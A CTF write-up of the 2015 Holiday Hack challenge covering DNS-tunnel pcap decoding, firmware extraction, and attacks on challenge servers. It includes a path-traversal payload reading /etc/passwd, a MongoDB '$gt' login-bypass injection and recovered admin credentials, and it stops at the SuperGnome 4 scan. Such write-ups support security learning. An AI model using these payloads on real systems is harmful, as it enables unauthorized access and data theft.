---
layout: post
title:  "Pwning Gnomes: CounterHack HolidayHack 2015 Writeup"
date:   2016-01-06 18:03:59
categories: CTF pcap pwn web
---

It is that time of year again! Time for the HolidayHack presented by [CounterHack](https://www.counterhackchallenges.com/)! This one is going to be fairly long, but boy are there a lot of cool challenges here. Everything from network forensics, web, image forensics, and even a pwnable.

Quick background about the story this year:

```
There is a new Christmas toy called Gnome in your Home. Duke Dosis managed to snag one of the last Gnome in your Home toys. Upon setting it up in their home, one of Duke's children, Josh, "opened his trusty Linux laptop and ran a wireless sniffer" and was greeted with a "mysterious barrage of traffic".
```

It is the analysis of this traffic that leads us down the path to figuring out the back story behind who created this toy.

## Part 1 - Dance of the Sugar Gnome Fairies

We are greeted with a generous `.pcap` present from Josh in the online game for Holiday Hack. We are also asked to answer the following two questions:

```
1) Which commands are sent across the Gnome’s command-and-control channel?
2) What image appears in the photo the Gnome sent across the channel from the Dosis home?
```

We tackle the `.pcap` file with good ole Wireshark. After opening the `.pcap`, we sort by packet info content. A quick glance over the info and we see DNS TXT request packets with the response ID of `0x1337`.

![part1-pcap](/assets/images/holidayhack2015/response_1337.png)

Hmm.. that is a bit odd.. What is in this DNS packet?

![part2-pcap](/assets/images/holidayhack2015/base64.png)

Double equals.. the obvious sign of [base64](https://en.wikipedia.org/wiki/Base64) encoding. 

Our task now is to extract all the DNS packets with Transaction ID of `0x1337` and base64 decode its data to see what is happening. We can utilize our trusty python `pcap` analysis tool [Scapy](https://github.com/jwiegley/scapy) to handle this task.

Our first task is to read in the pcap and grab all of the DNS packets:

```python
from scapy.all import  *
import base64

packets = rdpcap('gnome.pcap')

for packet in packets:
    if DNSQR in packet:
        print packet
```

Here, we are simply asking to print each packet with a `DNS` layer. For each of these packets, we now need to check if the Transaction ID is `0x1337` and grab the data from within that packet.


```python
from scapy.all import  *
import base64

packets = rdpcap('gnome.pcap')

for packet in packets:
    if DNSQR in packet:
        if packet[DNS].id == 0x1337:
            data = packet[DNS].an.rdata
            print data
```

Once we have the data, let's print the decoded values and see what is being transmitted.

```python
from scapy.all import  *
import base64

packets = rdpcap('gnome.pcap')

for packet in packets:
    if DNSQR in packet:
        if packet[DNS].id == 0x1337:
            data = packet[DNS].an.rdata
            decoded = base64.b64decode(data)
            print decoded
```

Let's take a quick look at the decoded packets.

<script type="text/javascript" src="https://asciinema.org/a/3iimdh7l82hkaclxoqcw9u250.js" id="asciicast-3iimdh7l82hkaclxoqcw9u250" async></script>

We found two things being transmitted in the weird DNS requests:

* The output from an `iwlist scan`. This would be used to perform reconnaissance on wireless access points in the area.
* An image of some kind.

So we have the answer to the first question:

```
The command being executed across the command and control is `iwlist scan` which serves as a method of gathering information about wireless access points in the vacinity of the Gnome.
```

Now, onto figuring out what that image is all about.

Let's take a look again at the output right as the image is being transmitted.

```
EXEC:                    IE: Unknown: 2F0100
EXEC:STOP_STATE
FILE:START_STATE,NAME=/root/Pictures/snapshot_CURRENT.jpg

### And lookie here.. looks like a file is being transferred.. over DNS?!

FILE:����JFIF��C
% , #&')*)-0-(0%()(��C
(((((((((((((((((((((((((((((((((((((((((((((((((((��"��
FILE:��W!1A"Qa2q�#B��3R��$b4r�%CS����&5t'c��7Ds�����TUde�������-!1A"Q2aq#�
```

We see that the image being sent is a `.jpg`, which has the interesting [file signature](http://www.garykessler.net/library/file_sigs.html) of `JFIF` in the first few bytes of its header. We can use this as indication that we are looking at the image data. The other annoying bit is that there is `FILE:` prepending all of the data in the transmission. 

In order to extract the image, we need to do the following:

* Flag that we are looking at `.jpg` image data
* Remove the `FILE:` indicator prepending each line

In order to accomplish the first bullet, we will simply have a global flag that will be set to `true` once we see the `JFIF` fly by. After that point, all data will be added to a buffer that will be written to a file after the parsing has completed.

The second bullet can be accomplished in Python very easily: `data = data.replace('FILE:', '')`.

Combining these two bullets, we should be able to extract the image with the following script:

```python
from scapy.all import  *
import base64

pkts = rdpcap('gnome.pcap')

commands = []

image = False
image_data = ''

# For each packet in the pcap, check for the DSN Transaction ID of 0x1337
# This was identified via manual analysis of the pcap itself
# Each of these packets contains a base64 encoded string containing
# command information.
for packet in pkts:
    if DNSQR in packet:
        if packet[DNS].id == 0x1337:
            data = packet[DNS].an.rdata
            decoded = base64.b64decode(data)
            if 'JFIF' in decoded or image:
                image_data += decoded.replace('FILE:', '')
                image = True
                continue

            # Only append commands that don't have FILE in the command
            commands.append(decoded)

with open('picture', 'wb') as f:
    f.write(image_data)

for command in commands:
    print command
```

After executing the script, we are presented with the picture being sent back to the mother ship (and the answer to the second question).

![part1-picture](/assets/images/holidayhack2015/picture.jpg)

We can hand in the message `GnomeNET-NorthAmerica` in the HolidayHack online game to receive the next challenge! Off to checkout the firmware of the SuperGnome!

## Part 2 - I’ll be Gnome for Christmas

```
3) What operating system and CPU type are used in the Gnome?  What type of web framework is the Gnome web interface built in?

4) What kind of a database engine is used to support the Gnome web interface? What is the plaintext password stored in the Gnome database?
```

After retrieving the exfiltrated image from the Gnome, we get a chance to analyze the firmware itself! Jessica, another one of the Dosis clan, was kind enough to give us the firmware herself to examine.

Beginning with the firmware, we attempt to parse the various pieces using `binwalk`. `binwalk` attempts to parse out file formats that it recognizes out of a binary blob, in this case, the Gnome firmware.

We can leverage [EpicTreasure](https://github.com/thebarbershopper/epictreasure) which has `binwalk` already installed by default.

```
binwalk -e firmware.bin
```

Here we recognize that the firmware contains a squashfs file system, which is also extracted via `unsquashfs` in `binwalk`.

Everything is better with visuals, though.

<script type="text/javascript" src="https://asciinema.org/a/2d6w8awfdsmmqacvlndnmxntp.js" id="asciicast-2d6w8awfdsmmqacvlndnmxntp" async></script>

Now that we have the full file system of a Gnome, let's start exploring.

To discover the operating system, we can take a look at in `/etc/`.

```
$ cat etc/*release
DISTRIB_ID='OpenWrt'
DISTRIB_RELEASE='Bleeding Edge'
DISTRIB_REVISION='r47650'
DISTRIB_CODENAME='designated_driver'
DISTRIB_TARGET='realview/generic'
DISTRIB_DESCRIPTION='OpenWrt Designated Driver r47650'
DISTRIB_TAINTS=''
```

Looks like we are dealing with an OpenWrt r47650 Linux distribution. And what arch are we running on? Let's ask the binaries in the firmware.

```
$ for f in $(ls bin/*); do file $f; done
bin/ash: ELF 32-bit LSB executable, ARM, version 1 (SYSV), dynamically linked (uses shared
bin/busybox: ELF 32-bit LSB executable, ARM, version 1 (SYSV), dynamically linked (uses shared
bin/cat: ELF 32-bit LSB executable, ARM, version 1 (SYSV), dynamically linked (uses shared
bin/chgrp: ELF 32-bit LSB executable, ARM, version 1 (SYSV), dynamically linked (uses shared
bin/chmod: ELF 32-bit LSB executable, ARM, version 1 (SYSV), dynamically linked (uses shared
bin/chown: ELF 32-bit LSB executable, ARM, version 1 (SYSV), dynamically linked (uses shared
bin/cp: ELF 32-bit LSB executable, ARM, version 1 (SYSV), dynamically linked (uses shared
bin/date: ELF 32-bit LSB executable, ARM, version 1 (SYSV), dynamically linked (uses shared
bin/dd: ELF 32-bit LSB executable, ARM, version 1 (SYSV), dynamically linked (uses shared
...
```

It also looks like we are running on ARM.

Finally, let's try to find the web framework that is being used. Taking a look at the `www/package.json` gives us a clue on the web framework.

```json
$ cat www/package.json
{
  "name": "1",
  "version": "0.0.0",
  "private": true,
  "scripts": {
    "start": "node ./bin/www"
  },
  "dependencies": {
    "body-parser": "^1.13.3",
    "cookie-parser": "~1.3.5",
    "debug": "~2.2.0",
    "diskusage": "^0.1.3",
    "express": "~4.13.1", <-- Could be using ExpressJS?
    "express-session": "^1.11.3",
    "jade": "~1.11.0",
    "mongodb": "^2.0.46",
    "monk": "^1.0.1",
    "morgan": "~1.6.1",
    "multer": "^1.0.6",
    "serve-favicon": "~2.3.0",
    "session": "^0.1.0",
    "sha1": "^1.1.1",
    "fs": "0.0.2"
  }
}
```

Let's take a look at the [Expressjs Getting Started](http://expressjs.com/en/starter/hello-world.html) page to cross reference with the code we have to confirm that Express is indeed in use.

The `app.js` from the `Getting Started` page:

```js
var express = require('express');
var app = express();

app.get('/', function (req, res) {
      res.send('Hello World!');
});

var server = app.listen(3000, function () {
      var host = server.address().address;
      var port = server.address().port;

      console.log('Example app listening at http://%s:%s', host, port);
});
```

The `app.js` from our Gnome:

```js
var express = require('express');
...
var app = express();
// view engine setup
app.set('views', path.join(__dirname, 'views'));
app.set('view engine', 'jade');
...
app.use('/', routes);
```

It appears they are indeed using `ExpressJS` as their framework. At this point, we can answer question 3:

```
SuperGnome is running on ARM with OpenWRT and using the Expressjs minimalist Node.js web framework to serve its web content.
```

Now that we have a basic understanding of how a Gnome is running, let's take a look at what is actually running in the backend.

A quick `find` will show us the database used for the web content.

```
$ find www/ -name *db*
...
www//node_modules/mongodb
www//node_modules/mongodb/lib/db.js
www//node_modules/mongodb/node_modules/kerberos/lib/auth_processes/mongodb.js
www//node_modules/mongodb/node_modules/mongodb-core
www//node_modules/mongodb/node_modules/mongodb-core/node_modules/bson/lib/bson/db_ref.js
www//node_modules/mongodb/test_boot/data/_mdb_catalog.wt
www//node_modules/monk/node_modules/mongodb
www//node_modules/monk/node_modules/mongodb/lib/mongodb
www//node_modules/monk/node_modules/mongodb/lib/mongodb/auth/mongodb_cr.js
www//node_modules/monk/node_modules/mongodb/lib/mongodb/auth/mongodb_gssapi.js
...
```

We see a lot of [MongoDB](https://www.mongodb.org/), a popular "next-generation database", being used in the web application. Assuming this is the database, let's find where the database resides in the firmware. Again, a quick `find` will help identify where the `mongodb` resides.

```
$ find . -name mongodb
./opt/mongodb <-- The juicy bits
./www/node_modules/mongodb
./www/node_modules/monk/node_modules/mongodb
./www/node_modules/monk/node_modules/mongodb/lib/mongodb
```

Heading into the `opt/mongodb` directory, we see a few files.

```
$ cd opt/mongodb/; ls
gnome.0      gnome.ns     journal      local.0      local.ns     mongod.lock  storage.bson
```

A quick `strings` on these files shows some very interesting information.

```
$ strings *
DCBA
gnome.cameras
cameraid
status
online
cameraid
status
online
G/6^
cameraid
status
online
G/6_
cameraid
status
online
G/6`
...
...
```

Looking through the contents, we see a mention of `admin`. Let's isolate that information from the `strings` output.

```
$ strings * | grep admin -C5
user
password
user
user_level
username
admin
password            <--- Woah!
SittingOnAShelf     <--- Cleartext password?
user_level
DCBA
gnome.users.$_id_
```

It looks like we have the answer to question 4 now:

```
The backend database is running on MongoDB. Inside the database are admin credentials of "admin : SittingOnAShelf".
```

Now where could the Gnomes be in the wild??

## Part 3 - Let it Gnome!  Let it Gnome!  Let it Gnome!

```
5) What are the IP addresses of the five SuperGnomes scattered around the world, as verified by Tom Hessman in the Dosis neighborhood?

6) Where is each SuperGnome located geographically?
```

After that successful analysis of SuperGnome firmware, we are tasked to find the SuperGnomes in the wild! Where could they be?

Let's take a look at the firmware one more time. After doing some more recon on the firmware, we stumble upon the `etc/hosts` file. This is the local file storing IP to Domain Name translations. Could a SuperGnome IP be found here?

```
$ cat etc/hosts
127.0.0.1 localhost

::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

# LOUISE: NorthAmerica build
52.2.229.189    supergnome1.atnascorp.com sg1.atnascorp.com supergnome.atnascorp.com sg.atnascorp.com
```

Ah, `52.2.229.189`. Could this be our first SuperGnome? Let's ask Tom just to make sure.

![SuperGnome01](/assets/images/holidayhack2015/scope_first_supergnome.png)

Sweet! So we are in scope, let's run a quick nmap scan to see what we are playing with.

```
$ nmap 52.2.229.189 --open

Starting Nmap 6.47 ( http://nmap.org ) at 2015-12-14 12:27 CST Nmap scan report for ec2-52-2-229-189.compute-1.amazonaws.com (52.2.229.189)
Host is up (0.082s latency).
Not shown: 997 filtered ports, 2 closed ports
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 9.50 seconds
```

Alright, so we are dealing with a web service of some kind.

![SuperGnome01-web](/assets/images/holidayhack2015/supergnome_web.png)

And we are prompted with an admin panel. Do our previously found credentials (`admin : SittingOnAShelf`) work for this panel?

![SuperGnome02-web](/assets/images/holidayhack2015/supergnome_web2.png)

Great success! We have admin access. Let's save this note for a later time and keep working to find the other SuperGnomes!

We notice the title of the web application contains `GIYH::ADMIN`:

![SuperGnome03-web](/assets/images/holidayhack2015/supergnome_web3.png)

Would some fancy Google Foo help us here? Maybe Google has already found SuperGnomes for us. Let's try the `intitle` verb in Google.

![SuperGnome04-web](/assets/images/holidayhack2015/supergnome_web4.png)

w00t! And we found a second SuperGnome! After clarifying with Tom, we can check out this box as well.

![SuperGnome05-web](/assets/images/holidayhack2015/supergnome_web5.png)

Two down, three to go. Google only knows about one other SuperGnome though, what about the other three? Let's try to query `shodan.io`, which specializes in finding internet-enabled devices. We can use a similar search term `GIYH` as before. (Reading back over the story, it looks like there was subtle hint in the story.. 'If you need inspiration for constructing your search, visit the Dosis Neighborhood and "sho Dan" your plan.' Silly, silly..)

![SuperGnome06-web](/assets/images/holidayhack2015/supergnome_web6.png)

It looks like `shodan` has indeed found all 5 SuperGnomes!

![SuperGnome07-web](/assets/images/holidayhack2015/supergnome_web7.png)

![SuperGnome08-web](/assets/images/holidayhack2015/supergnome_web8.png)

![SuperGnome09-web](/assets/images/holidayhack2015/supergnome_web9.png)

![SuperGnome10-web](/assets/images/holidayhack2015/supergnome_web10.png)

![SuperGnome11-web](/assets/images/holidayhack2015/supergnome_web11.png)

After verifying with Tom that these IPs are correct, we know we have the answer to questions five and six:

```
SG1 - 52.2.229.189 - Ashburn, US
SG2 - 52.34.3.80 - Boardman, US
SG3 - 52.64.191.71 - Sydney, Australia
SG4 - 52.192.152.132 - Tokyo, Japan
SG5 - 54.233.105.81 - Brazil
```

We now get the honor of hacking into each SuperGnome and exfiltrating data from each Gnome. Fun time! What better way of spending the holidays than hacking Gnomes in between face fulls of ham, turkey, and rolls.

The questions we are going to answer for each SuperGnome are below:

```
7) Please describe the vulnerabilities you discovered in the Gnome firmware.

8) ONCE YOU GET APPROVAL OF GIVEN IN-SCOPE TARGET IP ADDRESSES FROM TOM HESSMAN IN THE DOSIS NEIGHBORHOOD, attempt to remotely exploit each of the SuperGnomes.  Describe the technique you used to gain access to each SuperGnome’s gnome.conf file.  YOU ARE AUTHORIZED TO ATTACK ONLY THE IP ADDRESSES THAT TOM HESSMAN IN THE DOSIS NEIGHBORHOOD EXPLICITLY ACKNOWLEDGES AS “IN SCOPE.”  ATTACK NO OTHER SYSTEMS ASSOCIATED WITH THE HOLIDAY HACK CHALLENGE.
```

## SuperGnome 1 - Admin credentials

The first SuperGnome is accessible from the credentials we found on the firmware (`admin : SittingOnAShelf`). Checking out the `files` on the server, and we have access to the `gnome.conf` and a few `zip` files.

![sg01-1](/assets/images/holidayhack2015/sg01_1.png)

I guess the first SuperGnome was simply to prove that the credentials worked ;-)

Inside the zips, we find some interesting information.

First, we find a `.pcap` file in the `20141226101055.zip`. It looks to be a single TCP session. Let's use some Wireshark magic to make the session human readable.

![sg01-2](/assets/images/holidayhack2015/sg01_2.png)
![sg01-3](/assets/images/holidayhack2015/sg01_3.png)

We have a capture of an email being sent. The full contents of the email is shown below.

```
From: "c" <c@atnascorp.com>
To: <jojo@atnascorp.com>
Subject: GiYH Architecture
Date: Fri, 26 Dec 2014 10:10:55 -0500

JoJo,

As you know, I hired you because you are the best architect in town for a
distributed surveillance system to satisfy our rather unique business
requirements.  We have less than a year from today to get our final plans in
place.  Our schedule is aggressive, but realistic.

I've sketched out the overall Gnome in Your Home architecture in the diagram
attached below.  Please add in protocol details and other technical
specifications to complete the architectural plans.

Remember: to achieve our goal, we must have the infrastructure scale to
upwards of 2 million Gnomes.  Once we solidify the architecture, you'll work
with the hardware team to create device specs and
hardware in the February 2015 timeframe.

I've also made significant progress on distribution deals with retailers.

Thoughts?

Looking forward to working with you on this project!

-C
```

Interesting, with mention of an attached image, let's try to extract the image from the `.pcap` as well. We begin with the saved output from our TCP Session.

<script type="text/javascript" src="https://asciinema.org/a/7m4s3wu53vjey1n3xf7i4ic6e.js" id="asciicast-7m4s3wu53vjey1n3xf7i4ic6e" async></script>

This is the extracted image from the email.

![sg01-4_1](/assets/images/holidayhack2015/sg01_4.jpg)

Looks like we have the architecture diagram for SuperGnomes.. Interesting.. What else is on this SuperGnome?

Inside the `camera_feed_overlap_error.zip` is the following image:

![sg01-5](/assets/images/holidayhack2015/camera_feed_overlap_error.png)

And inside the `factory_cam_1.zip` is the following image:

![sg01-6](/assets/images/holidayhack2015/factory_cam_1.png)

Herm.. these images look a bit fuzzy. In the `GnomeNET` tab, there is a chat dialog that contains some intersting information.

```
Message ID 1:
Welcome to GnomeNET.

Message ID 2:
I noticed an issue when there are multiple child-gnomes with the same name. The image feeds become scrambled together. Any way to resolve this other than rename the gnomes?? ~DW

Message ID 3:
Can you provide an example of the scrambling you're seeing? ~PS

Message ID 4:
I uploaded 'camera_feed_overlap_error.png' to SG-01. We have six factory test cameras all named the same. The issue occurs only when they have the same name. It occurs even if the cameras are not transmitting an image. ~PS

Message ID 5:
 Oh, also, in the image, 5 of the cameras are just transmitting the 'camera disabled' static, the 6th one was in the boss' office. The door was locked and the boss seemed busy, so I didn't mess with that one. ~PS

Message ID 6:
To help me troubleshoot this, can you grab a still from all six cameras at the same time? Also, is this really an issue? ~DW

Message ID 7:
I grabbed a still from 5 of the 6 cameras, again, staying out of the boss' office! Each cam is directed to a different SG, so each SG has one of the 5 stills I manually snagged. I named them 'factory_cam_#.png' and pushed them up to the files menu. 'camera_feed_overlap_error.png' has that garbled image. Oh, and to answer your question. Yes. We have almost 2 million cameras... some of them WILL be named the same. Just fix it. ~PS

Message ID 8:
Took a look at your issue. It looks like the camera feed collector only cares about the name and will merge the feeds. Looks like each pixel is XORed... Its going to be a lot of work to fix this. We are too late in the game to push a new update to all the cameras... stop naming cameras the same name. ~DW
```

Sounds like the `camera_feed_overlap_error` image is an `xor'ed` image of the five `factory_cam` images from the five SuperGnomes. New goal: 

```
Find all five factory_cam images and then xor those five with the camera_feed_overlap_error image to potentially see the original image. Let's keep that in the back of our head.
```

Finally, we have the real flag: The `gnome.conf` file:

```
Gnome Serial Number: NCC1701
Current config file: ./tmp/e31faee/cfg/sg.01.v1339.cfg
Allow new subordinates?: YES
Camera monitoring?: YES
Audio monitoring?: YES
Camera update rate: 60min
Gnome mode: SuperGnome
Gnome name: SG-01
Allow file uploads?: YES
Allowed file formats: .png
Allowed file size: 512kb
Files directory: /gnome/www/files/
```

(Sounds like someone is a Star Trek fan: [NCC1701](https://en.wikipedia.org/wiki/USS_Enterprise_(NCC-1701)))

Phew! One SuperGnome down.. Four to go! Onward!

## SuperGnome 2 - Local File Include

We begin, as normal, with a typical nmap scan to see what we are working with.

```
$ nmap 52.34.3.80 --open

Starting Nmap 6.47 ( http://nmap.org ) at 2015-12-14 17:19 CST
Nmap scan report for ec2-52-34-3-80.us-west-2.compute.amazonaws.com (52.34.3.80)
Host is up (0.091s latency).
Not shown: 997 filtered ports, 2 closed ports
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 9.93 seconds
```

Alrighty, a simple web server. Sounds like a plan.

After logging into the admin panel with our admin credentials, we try to download the files like we did on SuperGnome 1, but are restricted.

![sg-02](/assets/images/holidayhack2015/sg02_2.png)

There must be another way. We see that there is a new functionality in the `Settings` tab. We can now upload files.

![sg-02](/assets/images/holidayhack2015/sg02_1.png)

Let's try and find this function in our source code found in the firmware. The source file can be found in `www/routes/index.js`. The `Upload` function is below.

```js
// SETTINGS UPLOAD
router.post('/settings', function(req, res, next) {
  if (sessions[sessionid].logged_in === true && sessions[sessionid].user_level > 99) { // AUGGIE: settings upload allowed for admins (admins are 100, currently)
    var filen = req.body.filen;
    var dirname = '/gnome/www/public/upload/' + newdir() + '/' + filen;
    var msgs = [];
    var free = 0;
    disk.check('/', function(e, info) {
      free = info.free;
    });
    try {
      fs.mknewdir(dirname.substr(0,dirname.lastIndexOf('/')));
      msgs.push('Dir ' + dirname.substr(0,dirname.lastIndexOf('/')) + '/ created successfully!');
    } catch(e) {
      if (e.code != 'EEXIST')
        throw e;
    }
    ...
});
```

So it looks like the "uploaded" filename is what matters here. The function assumes we might upload a full path to a file like `/tmp/filename`. It then tries to create the subsequent folder structure for us using a random directory. An illustration of how a directory is created is shown below:

```js
Path to file to upload: path/to/file
Remove filename:        path/to
Create directory path:  /gnome/www/public/upload/rAnDoM/path/to
```

Essentially, everything to the left of the last `/` will be created as a directory.

So we can create directories.. Not sure if that is anything special, let's keep looking.

Looking through the rest of the source code, we come across an interesting endpoint: `/cam`. Let's take a look at this function.

```js
// CAMERA VIEWER
// STUART: Note: to limit disclosure issues, this code checks to make sure the user asked for a .png file
router.get('/cam', function(req, res, next) {
  var camera = unescape(req.query.camera);
  // check for .png
  //if (camera.indexOf('.png') == -1) // STUART: Removing this...I think this is a better solution... right?
  camera = camera + '.png'; // add .png if its not found
  console.log("Cam:" + camera);
  fs.access('./public/images/' + camera, fs.F_OK | fs.R_OK, function(e) {
    if (e) {
        res.end('File ./public/images/' + camera + ' does not exist or access denied!');
    }
  });
  fs.readFile('./public/images/' + camera, function (e, data) {
    res.end(data);
  });
});
```

So we can send a `GET` request to the `/cam` endpoint with a parameter of `camera` to read a camera image. This works by taking the `camera` parameter and appending `.png` in order to read a given image. Let's give this a shot.

![sg-02](/assets/images/holidayhack2015/sg02_3.png)

Cool. So we can view images. What happens if we try to look at an obviously bad `.png` file?

![sg-02](/assets/images/holidayhack2015/sg02_4.png)

After a bit of playing with weird file names, we can land on a really strange scenario.

![sg-02](/assets/images/holidayhack2015/sg02_5.png)

Hmm.. According to the source, regardless of the filename, we should append `.png` to the end. If we ask for `camera.png`, we are expecting `camera.png.png` to return. Interesting.. I wonder if the commented line is actually not commented out on the server.

```js
// check for .png
//if (camera.indexOf('.png') == -1) // STUART: Removing this...I think this is a better solution... right?
camera = camera + '.png'; // add .png if its not found
```

If the `if` block isn't commented out, then we only append `.png` if the `camera` variable doesn't contain `.png` at all.. What if we have a `.png` in the middle of the file?

![sg-02](/assets/images/holidayhack2015/sg02_6.png)

Very cool! As long as `.png` is somewhere in the middle of what we request, we don't append a `.png`. Just for fun, can we try path traversal?

![sg-02](/assets/images/holidayhack2015/sg02_7.png)

Awesome, so it does work.. kinda. Can we stop it from prepending the final `.png`? Here is what we are thinking:

* If we include a file path containing `.png`, then we won't append `.png` to the end of the requested file
* Without the `.png` at the end of the file, we can request raw files, and grab the loot from this SuperGnome!

We then remember that we can create arbitrary directories using the `Settings` tab. Let's look at the full attack:

* Create a `.png` folder via the `Settings` tab.
* Use directory traversal to reach the `.png` path with the `/cam` endpoint
* Redirect the path traversal to any path we want!

First, we need to create a `.png` folder. Note: the file itself doesn't matter.

![sg-02](/assets/images/holidayhack2015/sg02_8.png)

We then note the directory structure that was created.

![sg-02](/assets/images/holidayhack2015/sg02_9.png)

From here, we can attempt a directory traversal to our newly created `.png` directory and then up to, say, `/etc/passwd`. Remember, as long as we hit our new `.png` folder, it doesn't matter where we go from there, the `.png` won't be appended to the end of the path.

```
../../../../../gnome/www/public/upload/ebFCODxd/.png/../../../../../../../etc/passwd
```

![sg-02](/assets/images/holidayhack2015/sg02_10.png)

Cha-ching! And that is how we can grab the files from this SuperGnome. Only step left is to redirect our file inclusion to `gnome.conf` and the other files in `/gnome/www/files`.

```
../../../../../gnome/www/public/upload/ebFCODxd/.png/../../../../files/gnome.conf
```
![sg-02](/assets/images/holidayhack2015/sg02_11.png)

Much like SuperGnome 1, there is a `.pcap` file that is a transmission of an email. Below is the email in this `.pcap`.

```
From: "c" <c@atnascorp.com>
To: <supplier@ginormouselectronicssupplier.com>
Subject: Large Order - Immediate Attention Required
Date: Wed, 25 Feb 2015 09:30:39 -0500

Maratha,

As a follow-up to our phone conversation, we'd like to proceed with an order
of parts for our upcoming product line.  We'll need two million of each of
the following components:

+ Ambarella S2Lm IP Camera Processor System-on-Chip (with an ARM Cortex A9
+ CPU and Linux SDK)
+ ON Semiconductor AR0330: 3 MP 1/3" CMOS Digital Image Sensor
+ Atheros AR6
+ 233X Wi-Fi adapter
+ Texas Instruments TPS65053 switching power supply
+ Samsung K4B2G16460 2GB SSDR3 SDRAM
+ Samsung K9F1G08U0D 1GB NAND Flash

Given the volume of this purchase, we fully expect the 35% discount you
mentioned during our phone discussion.  If you cannot agree to this pricing,
we'll place our order elsewhere.

We need delivery of components to begin no later than April 1, 2015, with
250,000 units coming each week, with all of them arriving no later than June
1, 2015.

Finally, as you know, this project requires the utmost secrecy.   Tell NO
ONE about our order, especially any nosy law enforcement authorities.

Regards,
-CW
```

And the `factory_cam_2.png` is also below.

![sg-02](/assets/images/holidayhack2015/factory_cam_2.png)

It also seems like the serial number (XKCD988) is pretty fitting as well..

![xkcd](http://imgs.xkcd.com/comics/tradition.png)

And now.. two down, three to go. To more SuperGnomes!

## SuperGnome 3 - NoSQL Injection

As per our normal strategy, let's see what ports are open on SuperGnome 3.

```
$ nmap 52.64.191.71 --open 

Starting Nmap 6.40 ( http://nmap.org ) at 2015-12-15 17:38 UTC
Nmap scan report for ec2-52-64-191-71.ap-southeast-2.compute.amazonaws.com (52.64.191.71)
Host is up (0.26s latency).
Not shown: 997 filtered ports, 2 closed ports
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 27.24 seconds
```

Cool, another web portal. Let's login with our credentials as per the previous two SuperGnomes.

![sg-03](/assets/images/holidayhack2015/sg03_1.png)

Wait.. our creds don't work anymore? Hmm.. Guess we have to find some sort of injection to login as admin.

We do know that the backend database is MongoDB. After doing [a bit of research](http://blog.websecurify.com/2014/08/hacking-nodejs-and-mongodb.html), we come across an interesting vector for MongoDB injection.

```
Content-Type: application/json
{
        "username": {"$gt": ""},
        "password": {"$gt": ""}
}
```

The article sums up the attack vector perfectly:

```
In the above ExpressJS handler, the username and password fields are not validated to ensure that they are strings. Therefore, when the JSON document is deserialized, those fields may contain anything but strings that can be used to manipulate the structure of the query. In MongoDB, the field $gt has a special meaning, which is used as the greater than comparator. As such, the username and the password from the database will be compared to the empty string "" and as a result return a positive outcome, i.e. a true statement.
```

This sounds perfect for our scenario. Now, we can fire up Burp Suite to try and use this vector. We first submit fake credentials and capture the request.

![sg-03](/assets/images/holidayhack2015/sg03_2.png)

Let's change the `POST` parameter to match our trial attack vector.

![sg-03](/assets/images/holidayhack2015/sg03_3.png)

Aaand.. we receive an interesting `301` response.

![sg-03](/assets/images/holidayhack2015/sg03_4.png)

We are issued a new session ID. If we use this session ID in a new `GET` request for the `/files`, what could happen?

![sg-03](/assets/images/holidayhack2015/sg03_5.png)

Strange.. It looks like we are actually logged in as a non-admin. Time to revisit our attack vector.

Instead of asking for the first user with our attack vector, can we specify `admin` specifically?

```
Content-Type: application/json
{
        "username": "admin",
        "password": {"$gt": ""}
}
```

![sg-03](/assets/images/holidayhack2015/sg03_6.png)

Alright, alright.. Good sign. We received the same `301` response. And if we try our new Session ID to view `/files`.

![sg-03](/assets/images/holidayhack2015/sg03_7.png)

W00t! And now we have `admin` rights! Only thing left to do is pull the relevant files off of the box.

The email in the `.pcap` (extracted using the same technique as the previous 2 SuperGnomes):

```
From: "c" <c@atnascorp.com>
To: <burglerlackeys@atnascorp.com>
Subject: All Systems Go for Dec 24, 2015
Date: Tue, 1 Dec 2015 11:33:56 -0500

My Burgling Friends, 

Our long-running plan is nearly complete, and I'm writing to share the date
when your thieving will commence!  On the morning of December 24, 2015, each
individual burglar on this email list will receive a detailed itinerary of
specific houses and an inventory of items to steal from each house, along
with still photos of where to locate each item.  The message will also
include a specific path optimized for you to hit your assigned houses
quickly and efficiently the night of December 24, 2015 after dark.

Further, we've selected the items to steal based on a detailed analysis of
what commands the highest prices on the hot-items open market.  I caution
you - steal only the items included on the list.  DO NOT waste time grabbing
anything else from a house.  There's no sense whatsoever grabbing crumbs too
small for a mouse!

As to the details of the plan, remember to wear the Santa suit we provided
you, and bring the extra large bag for all your stolen goods.

If any children observe you in their houses that night, remember to tell
them that you are actually "Santy Claus", and that you need to send the
specific items you are taking to your workshop for repair.  Describe it in a
very friendly manner, get the child a drink of water, pat him or her on the
head, and send the little moppet back to bed.  Then, finish the deed, and
get out of there.  It's all quite simple - go to each house, grab the loot,
and return it to the designated drop-off area so we can resell it.  And,
above all, avoid Mount Crumpit! 

As we agreed, we'll split the proceeds from our sale 50-50 with each
burglar.

Oh, and I've heard that many of you are asking where the name ATNAS comes
from.  Why, it's reverse SANTA, of course.  Instead of bringing presents on
Christmas, we'll be stealing them!

Thank you for your partnership in this endeavor. 

Signed:

-CLW

President and CEO of ATNAS Corporation
```

And the image from `factory_cam_3`:

![sg-03](/assets/images/holidayhack2015/factory_cam_3.png)

And, of course, our `gnome.conf`:

```
Gnome Serial Number: THX1138
Current config file: ./tmp/e31faee/cfg/sg.01.v1339.cfg
Allow new subordinates?: YES
Camera monitoring?: YES
Audio monitoring?: YES
Camera update rate: 60min
Gnome mode: SuperGnome
Gnome name: SG-03
Allow file uploads?: YES
Allowed file formats: .png
Allowed file size: 512kb
Files directory: /gnome/www/files/
```

PS - [THX1138](http://www.imdb.com/title/tt0066434/) (Current Serial Number) is George Lucas's first screenplay and is an amazing movie and one that should definitely be watched by all!

And forward we go! Three down, two to go! 

## SuperGnome 4 - Server Side Javascript Injection

As per our normal strategy, let's see what ports are open on SuperGnome 4.

```
$ nmap 52.192.152.132 --open -T4

Starting Nmap 6.47 ( http://nmap.org ) at 2015-12-15 13:13 CST
Nmap scan report for ec2-52-192-152-132.ap-northeast-1.compute.amazonaws.com (52.192.152.132)
Host is up (0.19s latency).
Not shown: 997 filtered ports, 2 closed ports
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 15.54 seconds
```

